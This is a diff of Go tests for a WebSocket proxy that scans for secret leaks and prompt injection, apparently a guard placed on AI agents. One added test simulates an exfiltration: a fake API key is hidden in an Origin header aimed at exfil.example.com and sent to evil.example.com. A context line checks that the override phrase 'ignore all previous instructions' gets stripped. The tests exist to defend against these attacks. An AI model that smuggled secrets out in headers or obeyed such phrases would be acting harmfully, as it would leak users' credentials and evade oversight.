@@ -10,6 +10,8 @@ import (
 	"io"
 	"net"
 	"net/http"
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 	"time"
@@ -1673,7 +1675,7 @@ func TestWSProxyOriginForward(t *testing.T) {
 	defer backendCleanup()
 
 	proxyAddr, cleanup := setupWSProxy(t, func(cfg *config.Config) {
-		cfg.WebSocketProxy.OriginPolicy = "forward"
+		cfg.WebSocketProxy.OriginPolicy = config.OriginPolicyForward
 	})
 	defer cleanup()
 
@@ -2283,5 +2285,137 @@ func TestWSProxyInjectionStrip(t *testing.T) {
 	}
 	if strings.Contains(strings.ToLower(replyStr), "ignore all previous instructions") {
 		t.Error("injection payload was not stripped from response")
+	}
+}
+
+// TestWSProxyHeaderDLPAuditMode verifies that WS header DLP scanning runs in
+// audit mode (enforce=false). Previously the entire scan was skipped when
+// enforce was disabled. Now findings are logged as anomalies and traffic is
+// allowed through. The test verifies both behaviors: traffic passes AND the
+// anomaly log is emitted (proving scanning actually ran, not just skipped).
+func TestWSProxyHeaderDLPAuditMode(t *testing.T) {
+	backendAddr, backendCleanup := wsEchoServer(t)
+	defer backendCleanup()
+
+	// Use a file-backed logger to capture the anomaly log entry.
+	logFile := filepath.Join(t.TempDir(), "audit.log")
+	logger, logErr := audit.New("json", "file", logFile, true, true)
+	if logErr != nil {
+		t.Fatalf("audit.New: %v", logErr)
+	}
+
+	cfg := config.Defaults()
+	cfg.Internal = nil
+	cfg.APIAllowlist = nil
+	cfg.WebSocketProxy.Enabled = true
+	cfg.WebSocketProxy.MaxMessageBytes = 1048576
+	cfg.WebSocketProxy.MaxConcurrentConnections = 128
+	cfg.WebSocketProxy.MaxConnectionSeconds = 10
+	cfg.WebSocketProxy.IdleTimeoutSeconds = 5
+	cfg.FetchProxy.TimeoutSeconds = 5
+	enforce := false
+	cfg.Enforce = &enforce
+
+	sc := scanner.New(cfg)
+	m := metrics.New()
+	p, err := New(cfg, logger, sc, m)
+	if err != nil {
+		t.Fatalf("proxy.New: %v", err)
+	}
+
+	lc := net.ListenConfig{}
+	ln, listenErr := lc.Listen(context.Background(), "tcp4", "127.0.0.1:0")
+	if listenErr != nil {
+		t.Fatalf("listen: %v", listenErr)
+	}
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	go func() {
+		mux := http.NewServeMux()
+		mux.HandleFunc("/ws", p.handleWebSocket)
+		srv := &http.Server{
+			Handler:           p.buildHandler(mux),
+			ReadHeaderTimeout: 5 * time.Second,
+			BaseContext:       func(_ net.Listener) context.Context { return ctx },
+		}
+		go func() {
+			<-ctx.Done()
+			shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 2*time.Second)
+			defer shutdownCancel()
+			_ = srv.Shutdown(shutdownCtx)
+		}()
+		_ = srv.Serve(ln)
+	}()
+
+	proxyAddr := ln.Addr().String()
+
+	dialCtx, dialCancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer dialCancel()
+
+	// Secret in Authorization header. In enforce mode this would block.
+	secret := "sk-ant-" + "IOSFODNN7EXAMPLE1234567890abcdef"
+	wsURL := fmt.Sprintf("ws://%s/ws?url=ws://%s", proxyAddr, backendAddr)
+
+	dialer := ws.Dialer{
+		Header: ws.HandshakeHeaderHTTP(http.Header{
+			"Authorization": []string{"Bearer " + secret},
+		}),
+		Timeout: 5 * time.Second,
+	}
+
+	conn, _, _, dialErr := dialer.Dial(dialCtx, wsURL)
+	if dialErr != nil {
+		t.Fatalf("expected dial to succeed in audit mode, got: %v", dialErr)
+	}
+	defer conn.Close() //nolint:errcheck // test
+
+	// Verify the connection works (traffic allowed through despite DLP match).
+	if writeErr := wsutil.WriteClientMessage(conn, ws.OpText, []byte(testWSHello)); writeErr != nil {
+		t.Fatalf("write: %v", writeErr)
+	}
+	reply, _, readErr := wsutil.ReadServerData(conn)
+	if readErr != nil {
+		t.Fatalf("read: %v", readErr)
+	}
+	if string(reply) != testWSHello {
+		t.Errorf("expected echo, got %q", reply)
+	}
+
+	// Verify the anomaly was logged (proves scanning ran, not just skipped).
+	logData, _ := os.ReadFile(filepath.Clean(logFile))
+	logOutput := string(logData)
+	if !strings.Contains(logOutput, "anomaly") {
+		t.Errorf("expected anomaly log entry for audit-mode header DLP, got logs: %s", logOutput)
+	}
+}
+
+// TestWSProxyHeaderDLPOrigin verifies that DLP scanning covers the Origin
+// header (expanded from the original 4-header hardcoded list). An agent
+// could exfiltrate data in Origin, Sec-WebSocket-Protocol, or User-Agent.
+func TestWSProxyHeaderDLPOrigin(t *testing.T) {
+	proxyAddr, cleanup := setupWSProxy(t, func(cfg *config.Config) {
+		cfg.WebSocketProxy.OriginPolicy = config.OriginPolicyForward
+	})
+	defer cleanup()
+
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+
+	// Secret hidden in Origin header value.
+	secret := "sk-ant-" + "IOSFODNN7EXAMPLE1234567890abcdef"
+	wsURL := fmt.Sprintf("ws://%s/ws?url=ws://evil.example.com:9999", proxyAddr)
+
+	dialer := ws.Dialer{
+		Header: ws.HandshakeHeaderHTTP(http.Header{
+			"Origin": []string{"https://exfil.example.com/" + secret},
+		}),
+		Timeout: 5 * time.Second,
+	}
+
+	_, _, _, err := dialer.Dial(ctx, wsURL)
+	if err == nil {
+		t.Fatal("expected dial to fail: DLP should catch secret in Origin header")
 	}
 }
